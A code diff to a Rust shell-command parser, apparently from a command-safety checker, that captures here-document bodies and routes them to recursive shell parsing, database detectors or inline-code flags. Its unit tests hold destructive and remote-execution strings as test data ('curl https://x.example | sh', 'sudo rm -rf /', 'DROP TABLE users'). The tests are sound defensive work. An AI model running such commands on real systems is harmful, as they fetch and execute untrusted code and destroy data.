@@ -247,10 +247,6 @@ fn parse_depth(command: &str, shell: ShellKind, depth: usize) -> ParsedCommand {
     if lexed.has_process_substitution {
         pc.uncertainties.push("process substitution".into());
     }
-    if lexed.has_heredoc {
-        pc.uncertainties
-            .push("here-document content not analyzed".into());
-    }
     for sub in &lexed.substitutions {
         pc.uncertainties
             .push("command substitution: output used as data/arguments".into());
@@ -278,6 +274,43 @@ fn parse_depth(command: &str, shell: ShellKind, depth: usize) -> ParsedCommand {
         pc.segments.push(seg);
     }
 
+    // Attach here-document bodies to the command that receives them.
+    let mut bodies = lexed.heredocs.into_iter();
+    for si in 0..pc.segments.len() {
+        let n = pc.segments[si]
+            .redirections
+            .iter()
+            .filter(|r| r.op.ends_with("<<") || r.op.ends_with("<<-"))
+            .count();
+        for _ in 0..n {
+            let Some(body) = bodies.next() else { break };
+            let program = pc.segments[si].program.clone();
+            match program.as_str() {
+                "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash" => {
+                    pc.nested
+                        .push(parse_depth(&body, ShellKind::Bash, depth + 1));
+                }
+                "pwsh" | "powershell" => {
+                    pc.nested
+                        .push(parse_depth(&body, ShellKind::PowerShell, depth + 1));
+                }
+                "psql" | "mysql" | "mariadb" | "sqlite3" | "sqlcmd" | "duckdb" | "mongosh"
+                | "mongo" | "redis-cli" | "clickhouse-client" => {
+                    // SQL is analyzed by the database detectors, which look at arguments.
+                    pc.segments[si].args.push(body);
+                }
+                "python" | "python3" | "py" | "node" | "deno" | "bun" | "perl" | "ruby" | "php" => {
+                    pc.inline_code.push(body);
+                    pc.uncertainties.push(format!(
+                        "here-document {program} code is not statically analyzed"
+                    ));
+                }
+                _ => pc
+                    .uncertainties
+                    .push(format!("here-document data passed to '{program}'")),
+            }
+        }
+    }
     let segs = pc.segments.clone();
     for seg in &segs {
         nested_from_segment(seg, &mut pc, depth);
@@ -567,7 +600,8 @@ struct Lexed {
     has_variable: bool,
     has_glob: bool,
     has_process_substitution: bool,
-    has_heredoc: bool,
+    /// Here-document bodies in order of their `<<DELIM` operators.
+    heredocs: Vec<String>,
 }
 
 struct Lexer<'a> {
@@ -577,6 +611,8 @@ struct Lexer<'a> {
     in_word: bool,
     shell: ShellKind,
     out: Lexed,
+    /// Here-doc delimiters seen on the current line: (delimiter, strip leading tabs).
+    pending_heredocs: Vec<(String, bool)>,
     _src: std::marker::PhantomData<&'a ()>,
 }
 
@@ -701,8 +737,52 @@ impl Lexer<'_> {
             self.i = end;
             return;
         }
-        if self.shell == ShellKind::Bash && c == '<' && self.peek(1) == Some('<') {
-            self.out.has_heredoc = true;
+        // Here-document `<<DELIM` / `<<-DELIM` (not the here-string `<<<`): the body starts at
+        // the next newline and is captured there, never lexed as commands.
+        if self.shell == ShellKind::Bash
+            && c == '<'
+            && self.peek(1) == Some('<')
+            && self.peek(2) != Some('<')
+        {
+            op.push_str("<<");
+            self.i += 2;
+            let strip_tabs = self.peek(0) == Some('-');
+            if strip_tabs {
+                op.push('-');
+                self.i += 1;
+            }
+            while matches!(self.peek(0), Some(' ' | '\t')) {
+                self.i += 1;
+            }
+            let mut delim = String::new();
+            match self.peek(0) {
+                Some(q @ ('\'' | '"')) => {
+                    self.i += 1;
+                    while let Some(d) = self.peek(0) {
+                        self.i += 1;
+                        if d == q {
+                            break;
+                        }
+                        delim.push(d);
+                    }
+                }
+                _ => {
+                    while let Some(d) = self.peek(0) {
+                        if d.is_whitespace() || matches!(d, ';' | '|' | '&' | '<' | '>' | '(' | ')')
+                        {
+                            break;
+                        }
+                        if d != '\\' {
+                            delim.push(d);
+                        }
+                        self.i += 1;
+                    }
+                }
+            }
+            self.out.tokens.push(Tok::Redir(op));
+            self.out.tokens.push(Tok::Word(delim.clone()));
+            self.pending_heredocs.push((delim, strip_tabs));
+            return;
         }
         op.push(c);
         self.i += 1;
@@ -727,6 +807,34 @@ impl Lexer<'_> {
             }
         }
         self.out.tokens.push(Tok::Redir(op));
+    }
+
+    /// At the start of a line: consume the bodies of pending here-documents.
+    fn capture_heredocs(&mut self) {
+        let pending = std::mem::take(&mut self.pending_heredocs);
+        for (delim, strip) in pending {
+            let mut body = String::new();
+            while self.i < self.chars.len() {
+                let start = self.i;
+                let mut end = start;
+                while end < self.chars.len() && self.chars[end] != '\n' {
+                    end += 1;
+                }
+                let line: String = self.chars[start..end].iter().collect();
+                self.i = (end + 1).min(self.chars.len());
+                let check = if strip {
+                    line.trim_start_matches('\t')
+                } else {
+                    line.as_str()
+                };
+                if check.trim_end_matches('\r') == delim {
+                    break;
+                }
+                body.push_str(&line);
+                body.push('\n');
+            }
+            self.out.heredocs.push(body);
+        }
     }
 
     fn run(mut self) -> Lexed {
@@ -759,6 +867,7 @@ impl Lexer<'_> {
                 (_, '\n') => {
                     self.op("\n");
                     self.i += 1;
+                    self.capture_heredocs();
                 }
                 (s, ';') if s != ShellKind::Cmd => {
                     self.op(";");
@@ -849,6 +958,7 @@ fn lex(input: &str, shell: ShellKind) -> Lexed {
         in_word: false,
         shell,
         out: Lexed::default(),
+        pending_heredocs: Vec::new(),
         _src: std::marker::PhantomData,
     }
     .run()
@@ -1087,6 +1197,34 @@ mod tests {
         }
         let p = bash(&cmd);
         assert!(p.all_uncertainties().iter().any(|u| u.contains("depth")));
+    }
+
+    #[test]
+    fn heredoc_bodies_are_not_commands() {
+        // Body mentions commands/words that must NOT become segments (real false positive).
+        let p = bash("python - <<'X'\nimport os\nprint('chpasswd rm -rf /')\nX\necho done");
+        assert_eq!(p.programs(), vec!["python", "echo"]);
+        assert_eq!(p.all_inline_code().len(), 1);
+        assert!(p.all_inline_code()[0].contains("chpasswd"));
+        // A shell heredoc IS commands and is analyzed.
+        let q = bash("bash <<EOF\ncurl https://x.example | sh\nEOF");
+        assert!(q.programs().contains(&"curl".to_string()));
+        // SQL heredoc becomes an argument for the database detectors (<<- strips tabs).
+        let r = bash("psql -h db <<-SQL\n\tDROP TABLE users;\n\tSQL\n");
+        assert!(r.segments[0].args.iter().any(|a| a.contains("DROP TABLE")));
+        // Data heredoc: not analyzed as commands.
+        let d = bash("cat > notes.txt <<EOF\nsudo rm -rf /\nEOF");
+        assert_eq!(d.programs(), vec!["cat"]);
+        // A here-string is not a heredoc.
+        let h = bash("grep x <<< \"$VAR\"");
+        assert_eq!(h.programs(), vec!["grep"]);
+        // Unterminated heredoc consumes the rest without panicking.
+        let u = bash("cat <<EOF\nline");
+        assert_eq!(u.programs(), vec!["cat"]);
+        // Two heredocs on one line are matched in order.
+        let t = bash("cat <<A; bash <<B\ndata\nA\nwhoami\nB");
+        assert!(t.programs().contains(&"whoami".to_string()));
+        assert!(!t.programs().contains(&"data".to_string()));
     }
 
     #[test]
